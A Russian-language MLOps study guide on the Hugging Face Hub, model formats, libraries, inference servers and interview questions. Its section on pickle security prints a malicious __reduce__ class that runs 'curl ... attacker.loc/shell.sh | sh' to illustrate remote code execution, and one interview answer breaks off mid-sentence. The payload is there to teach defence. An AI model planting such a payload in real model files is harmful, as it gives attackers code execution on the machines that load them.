## 1. Как устроен Hugging Face Hub и локальный кэш `HF_HOME`

**Hugging Face Hub (`huggingface.co`)** — это де-факто центральный реестр
открытых весов моделей (Model Hub) и датасетов (Datasets Hub). Для
DevOps/MLOps-инженера важно понимать, что каждый репозиторий на Hugging
Face — это полноценный **Git-репозиторий**, расширенный объектным
хранилищем больших блобов (Git-LFS и новый чанковый движок **Xet**).

### 1.1 Что лежит внутри репозитория модели
Типичный репозиторий трансформера (например, `BAAI/bge-m3` или
`Qwen/Qwen2.5-7B-Instruct`) состоит из двух групп файлов:
1. **Легковесные конфигурационные файлы (обычный Git):**
   - `config.json` — архитектура нейросети (число слоёв, размер скрытого
     состояния `hidden_size`, тип функции активации).
   - `tokenizer.json` и `tokenizer_config.json` — словарь и правила
     разбиения текста на токены, включая `chat_template` (Jinja2-шаблон
     разметки ролей `system`/`user`/`assistant`).
   - `README.md` (**Model Card**) — YAML-заголовок с лицензией
     (`apache-2.0`, `mit`, проприетарная), языками, базовой моделью и
     таблицами бенчмарков.
2. **Тяжёлые бинарные файлы весов (LFS / Xet блобы по 0.5–20 ГБ):**
   - `model.safetensors` (или шардированные части
     `model-00001-of-00004.safetensors` + индекс `model.safetensors.index.json`).

### 1.2 Пиннинг ревизий (`revision`) и Gated-модели
По умолчанию вызов `AutoModel.from_pretrained("BAAI/bge-m3")` качает
ветку `main`. Если завтра авторы модели обновят `tokenizer.json` или веса
в `main`, ваш продакшн-пайплайн при пересборке молча изменит поведение!

**Правило продакшна:** всегда фиксировать точный 40-символьный `commit
SHA` через параметр `revision`:

```python
from huggingface_hub import snapshot_download

# Детерминированное скачивание конкретной ревизии модели
model_path = snapshot_download(
    repo_id="BAAI/bge-m3",
    revision="5617a9f61b028005a4858fdac845db406aefb181",
    allow_patterns=["*.safetensors", "*.json", "*.txt"],
)
```

Некоторые модели (семейства `Llama`, `Gemma`) являются **Gated Models**:
перед скачиванием необходимо принять лицензию в веб-интерфейсе HF и
передать токен чтения через переменную окружения `HF_TOKEN`.

### 1.3 Внутреннее устройство кэша `HF_HOME` (симлинки и дедупликация)
Когда `huggingface_hub` скачивает модель в `$HF_HOME/hub/`, он не кладёт
файлы напрямую в рабочую папку, а строит контент-адресуемое хранилище
(аналогично Git и `uv`):

```text
$HF_HOME/hub/models--BAAI--bge-m3/
├── blobs/
│   ├── 4a8f9c...  # Реальный файл config.json (имя = SHA256 контента)
│   └── 9e1d2b...  # Реальный файл model.safetensors (2.2 ГБ)
├── refs/
│   └── main       # Содержит строку коммита: 5617a9f6...
└── snapshots/
    └── 5617a9f6.../
        ├── config.json -> ../../blobs/4a8f9c...         # Симлинк!
        └── model.safetensors -> ../../blobs/9e1d2b...   # Симлинк!
```

Если в новой ревизии модели изменился только `README.md`, а 2.2-гигабайтный
файл `model.safetensors` остался прежним, новый снапшот просто создаст
симлинк на существующий файл в `blobs/` без повторного скачивания.

## 2. Альтернативные хабы и корпоративная доставка весов (`ORAS`, `Ollama`, `NGC`)

В реальной работе MLOps-инженера помимо Hugging Face используются ещё
четыре важных источника и способа доставки моделей:

### 2.1 Ollama Registry и `Modelfile`
Для локального запуска LLM в формате `GGUF` используется реестр
`ollama.com/library`. Упаковка модели описывается декларативным файлом
`Modelfile` (прямой аналог `Dockerfile`):
- инструкция `FROM` указывает на базовую GGUF-модель;
- `ADAPTER` подключает дообученный LoRA-адаптер;
- `PARAMETER` фиксирует число потоков CPU (`num_thread 6`), длину
  контекста (`num_ctx 8192`) и температуру;
- `SYSTEM` задаёт встроенный системный промпт.

### 2.2 ModelScope и NVIDIA NGC
- **ModelScope (`modelscope.cn`):** открытый хаб от Alibaba Cloud. Многие
  релизы семейств `Qwen`, `Wan` и `DeepSeek`, а также специализированные
  квантованные сборки появляются там синхронно или раньше, чем на HF.
- **NVIDIA NGC (`catalog.ngc.nvidia.com`):** корпоративный каталог
  оптимизированных Docker-образов (`Triton Inference Server`, `vLLM`,
  `NeMo`) и предквантованных моделей под TensorRT-LLM.

### 2.3 Хранение моделей в обычном Docker Registry (`ORAS` и `KitOps`)
В закрытых корпоративных сетях (банки, госсектор, медицина) доступ к
`huggingface.co` из продакшн-кластеров Kubernetes заблокирован. Поднимать
отдельный проприетарный сервер только ради раздачи весов не нужно:
современные реестры контейнеров (**Harbor**, **GitLab Container Registry**,
**AWS ECR**, **Nexus**) поддерживают стандарт **OCI Artifacts**.

Утилита **`oras` (OCI Registry As Storage)** или **`kit` (KitOps
ModelKit)** позволяет пушить файлы `.onnx`, `.safetensors` и `.gguf` прямо
в корпоративный Docker-реестр как слои OCI-образа:

```bash
# Отправить скомпилированную ONNX-модель и конфиг в корпоративный Harbor
oras push harbor.internal/mlops/doc-router:v1.2.0 \
  model.onnx:application/vnd.onnx.model \
  config.json:application/json

# Выкачать модель внутри initContainer в Kubernetes
oras pull harbor.internal/mlops/doc-router:v1.2.0 -o /models/router/
```

## 3. Бинарная анатомия форматов: `pickle` vs `safetensors` vs `GGUF` vs `ONNX`

### 3.1 Почему `pickle` (`.pkl`, `.pt`, `.bin`) — это критическая уязвимость RCE
Исторически `scikit-learn` (`joblib.dump`) и `PyTorch` (`torch.save`)
сохраняли модели через стандартный модуль Python `pickle`.

Формат `pickle` — это **не просто данные, а стек-машина с исполняемым
байткодом**. Любой объект Python при десериализации может определить
магический метод `__reduce__()`, возвращающий произвольную функцию и её
аргументы:

```python
import os
import pickle


class MaliciousModel:
    def __reduce__(self):
        # Выполнится прямо внутри pickle.loads() или torch.load()!
        return (os.system, ("curl -s http://attacker.loc/shell.sh | sh",))
```

Если инженер скачал чужой файл `pytorch_model.bin` или `model.pkl` и
вызвал `pickle.load()`, вредоносный код исполняется **в момент загрузки
файла в память**, ещё до вызова `.predict()`.

### 3.2 Как устроен `safetensors` под капотом
Формат **`safetensors`** (разработанный Hugging Face) полностью устраняет
угрозу RCE и решает проблему медленной загрузки:

```text
┌─────────────────────────┬───────────────────────────────────┬──────────────────────────┐
│ Первые 8 байт (uint64)  │ N байт: UTF-8 JSON-заголовок      │ Плоский буфер байтов     │
│ Размер заголовка N      │ {"weight1": {"dtype": "F16",      │ (сырые тензоры подряд,   │
│ (little-endian)         │  "shape": [768, 768],             │ выровненные под mmap)    │
│                         │  "data_offsets": [0, 1179648]}}   │                          │
└─────────────────────────┴───────────────────────────────────┴──────────────────────────┘
```

1. **Никакого исполнения кода:** парсер читает только JSON со смещениями
   (`data_offsets`) и размерностями матриц.
2. **Мгновенная инспекция:** прочитав всего первые несколько килобайт
   файла, можно узнать список всех слоёв и точность весов (`F32`, `F16`,
   `BF16`, `I8`), не читая гигабайты тензоров.
3. **Zero-copy через `mmap(2)`:** буфер тензоров сразу отображается из
   Page Cache ядра Linux в память процесса без копирования.

### 3.3 Формат `GGUF` (для `llama.cpp` и `Ollama`)
Когда мы запускаем LLM на процессоре Intel 155H и 64 ГБ RAM, нам нужен
один самодостаточный файл, не требующий Python и `transformers`. Формат
**`GGUF` (GGML Universal File)** объединяет внутри одного файла:
- заголовок с магическими байтами `GGUF` и версией формата;
- пары ключ-значение с полным словарём токенизатора, гиперпараметрами
  архитектуры (`llama.context_length`, `llama.embedding_length`) и
  шаблоном чата;
- выровненные по страницам памяти (`32/64 байта`) блоки квантованных
  весов.

**Что означает шифр квантования `Q4_K_M`:**
- `Q4` — веса сжаты с 16 бит (`FP16`) до 4 бит на параметр (размер модели
  в RAM и объём чтения с шины памяти уменьшаются почти в 4 раза!).
- `K` (K-quants) — блочное квантование с суперблоками (веса группируются
  по 256 значений с общими коэффициентами масштабирования `scale/min`).
- `M` (Medium) — смешанная точность: обычные слои квантуются в 4 бита, а
  самые чувствительные к деградации матрицы внимания (`attention.wv`,
  `feed_forward.w2`) сохраняются в 6 бит (`Q6_K`), удерживая до 99%
  качества исходной `FP16`-модели.

### 3.4 Форматы `ONNX` и `OpenVINO IR`
`safetensors` хранит только веса (числа), но не хранит сам код формулы
вычислений (для него нужен Python-код класса модели).
- **`ONNX` (Open Neural Network Exchange)** сохраняет в один Protobuf-файл
  `.onnx` **и вычислительный граф операторов (`MatMul`, `Add`, `Relu`,
  `Softmax`), и веса**. Такой файл запускается в C++ движке **`ONNX
  Runtime`** без единой строчки кода PyTorch или Scikit-Learn со скоростью
  1–2 миллисекунды на CPU.
- **`OpenVINO IR` (`.xml` граф + `.bin` веса)** — специализированный
  формат Intel, который дополнительно оптимизирует граф под инструкции
  процессора Intel 155H, встроенную графику **Intel Arc iGPU** и **NPU**.

## 4. Ключевые библиотеки экосистемы: от `transformers` до `peft` и `optimum`

| Библиотека | Назначение в пайплайне |
| :--- | :--- |
| `huggingface_hub` | Клиент загрузки/выгрузки моделей и датасетов, управление кэшем и ревизиями |
| `transformers` | Единый API загрузки архитектур (`AutoModel`, `AutoTokenizer`, `pipeline`) |
| `tokenizers` | Сверхбыстрый токенизатор на Rust (BPE, WordPiece, Unigram) |
| `datasets` | Работа с датасетами на базе **Apache Arrow** (memory-mapped чтение с диска без переполнения RAM) |
| `sentence-transformers` | Обучение и запуск эмбеддеров (`bge-m3`, `multilingual-e5`) и Cross-Encoder реранкеров |
| `peft` | Дообучение больших моделей малым числом параметров (**LoRA / QLoRA** адаптеры весом 10–50 МБ) |
| `trl` | Библиотека дообучения LLM (`SFTTrainer` для Supervised Fine-Tuning, `DPOTrainer` для выравнивания ответов) |
| `optimum` | Мост аппаратной оптимизации: экспорт моделей в `ONNX Runtime` (`optimum[onnxruntime]`) и `OpenVINO` (`optimum-intel`) + квантование `int8` |

## 5. Бенчмаркинг (`lighteval`) и серверы инференса (`TGI` vs `vLLM` vs `llama.cpp`)

### 5.1 Инструменты оценки моделей
- **`evaluate`:** библиотека стандартных метрик (`f1`, `roc_auc`, `bleu`,
  `rouge`).
- **`lighteval` и `lm-evaluation-harness`:** промышленные фреймворки для
  тестирования LLM на стандартных и кастомных бенчмарках. На локальной
  машине мы запускаем их не на миллионах примеров, а на маленьком
  подмножестве (нашем **Golden Dataset** из 30–50 задач по личным
  документам).

### 5.2 Какой сервер инференса выбрать под задачу и железо

| Сервер | Формат весов | Требование к железу | Когда выбирать |
| :--- | :--- | :--- | :--- |
| **`llama.cpp` / `Ollama`** | `GGUF` | **CPU, Intel Arc (Vulkan/SYCL), Apple Silicon, GPU** | Идеален для локального стенда на Intel 155H + 64 ГБ RAM и edge-серверов без карт NVIDIA |
| **`ONNX Runtime`** | `.onnx` | **CPU (AVX2/VNNI), OpenVINO, CUDA** | Лучший выбор для классических моделей, роутеров, эмбеддеров (`bge-m3`) и реранкеров |
| **`vLLM`** | `safetensors`, `AWQ`, `GPTQ`, `FP8` | Дискретный GPU (в первую очередь NVIDIA CUDA / AMD ROCm) | Продакшн-стандарт для высокого RPS: `PagedAttention`, Continuous Batching |
| **`TGI` (Text Generation Inference)** | `safetensors` | Серверный GPU | Референсный сервер от самого Hugging Face (в новых проектах чаще уступает `vLLM`) |

## 6. Типовые вопросы на собеседовании (Interview Q&A)

**1. Почему загрузка чужих моделей в формате `.pt` / `.pkl` через
`torch.load()` или `pickle.load()` является критической уязвимостью ИБ?**
*Ответ:* Формат `pickle` сериализует объекты как набор инструкций для
виртуальной стек-машины. С помощью метода `__reduce__()` злоумышленник
может встроить в файл весов вызов `os.system` или `subprocess.Popen`.
Произвольный код выполнится прямо в момент чтения файла с диска до любых
проверок архитектуры модели.

**2. За счёт чего формат `safetensors` одновременно безопаснее и быстрее
при старте пода, чем классический `pickle`?**
*Ответ:* Во-первых, заголовок `safetensors` — это чистый декларативный
JSON с типами данных и байтовыми смещениями (`data_offsets`), в котором
нет исполняемых инструкций. Во-вторых, тензоры лежат в файле плоским
выровненным массивом байтов, что позволяет отобразить их в память процесса
через системный вызов `mmap(2)` (zero-copy) без двойного выделения RAM.

**3. В чём принципиальная разница между `safetensors`, `GGUF` и `ONNX`?**
*Ответ:* `safetensors` хранит только тензоры весов (для запуска нужен
Python-код модели из `transformers`). `GGUF` упаковывает в один файл и
квантованные веса, и словарь токенизатора, и метаданные архитектуры для
автономного запуска в C++ движке `llama.cpp`. `ONNX` хранит внутри себя и
веса, и сам **вычислительный граф операторов**, что позволяет исполнять
модель в `ONNX Runtime` на любом языке (C++, Go, Python) без PyTorch.

**4. Почему в продакшне нельзя вызывать `from_pretrained("org/model")`
без указания аргумента `revision`?**
*Ответ:* Без `revision` библиотека обращается к плавающей ветке `main`.
Любой коммит автора репозитория на Hugging Face (изменение токенизатора,
конфига или весов) приведёт к непредсказуемому изменению поведения сервиса
при следующем рестарте или сборке образа (нарушение воспроизводимости и
риск Supply Chain атаки).

**5. Как устроено хранение файлов внутри локального кэша `$HF_HOME/hub`
и почему оно не дублирует данные при обновлении мелких файлов в репо?**
*Ответ:* Кэш использует контент-адресуемое хранилище: все скачанные файлы
складываются в папку `blobs/`, где имя каждого файла равно его `SHA256`
хэшу. В папке `snapshots/<commit_sha>/` создаются только легковесные
символические ссылки (`symlinks`) на соответствующие блобы.

**6. Как доставить веса моделей в продакшн-кластер Kubernetes в закрытом
банковском контуре без доступа к `huggingface.co` и без поднятия
отдельного сервера моделей?**
*Ответ:* Использовать стандарт **OCI Artifacts** и утилиту `oras` (или
`KitOps ModelKit`): веса моделей (`.onnx`, `.safetensors`, `.gguf`)
пушатся прямо в существующий корпоративный реестр контейнеров (Harbor,
GitLab Registry, Nexus) и скачиваются в под через `initContainer`, а в
основном контейнере выставляется `HF_HUB_OFFLINE=1`.

**7. Что означают буквы в названии квантования `Q4_K_M` для GGUF-моделей?**
*Ответ:* `Q4` — базовое сжатие весов до 4 бит на параметр; `K` (K-quants)
— блочное квантование с использованием суперблоков и коэффициентов
масштабирования; `M` (Medium) — смешанная точность, при которой наиболее
важные матрицы механизма внимания и выходного слоя сохраняются в повышенной
точности (6 бит, `Q6_K`), чтобы минимизировать потерю качества (perplexity).

**8. Зачем нужна библиотека `peft` и что физически представляет собой
сохранённый LoRA-адаптер на диске?**
*Ответ:* При полном файнтюнинге (Full Fine-Tuning) 8B-модели нужно менять
все 8 миллиардов параметров (требуются десятки гигабайт памяти под
градиенты и состояния оптимизатора Adam). `peft` (LoRA) замораживает
исходную модель и обучает только две маленькие низкоранговые матрицы
размерности $d \times r$ и $r \times k$ (где ранг $r \ll d$, например
$r = 16$). На диске адаптер — это отдельный файл `adapter_model.safetensors`
размером всего 15–50 МБ.

**9. Почему библиотека `datasets` от Hugging Face может обрабатывать
датасет на 100 ГБ на машине с 16 ГБ оперативной памяти без ошибки OOM?**
*Ответ:* Под капотом `datasets` хранит таблицы в колоночном бинарном

**10. Зачем конвертировать эмбеддер (`bge-m3`) или классификатор из
PyTorch в `ONNX` + `int8` через библиотеку `optimum` для работы на CPU?**
*Ответ:* Обычный PyTorch тратит время на накладные расходы Python и
динамического графа. При экспорте в `ONNX` граф статически оптимизируется
(склеиваются соседние операции — operator fusion: `Linear + Gelu +
LayerNorm`), а квантование `int8` задействует аппаратные инструкции
процессора (`AVX-VNNI`), ускоряя инференс на CPU в 2.5–4 раза при
сокращении расхода памяти вчетверо.
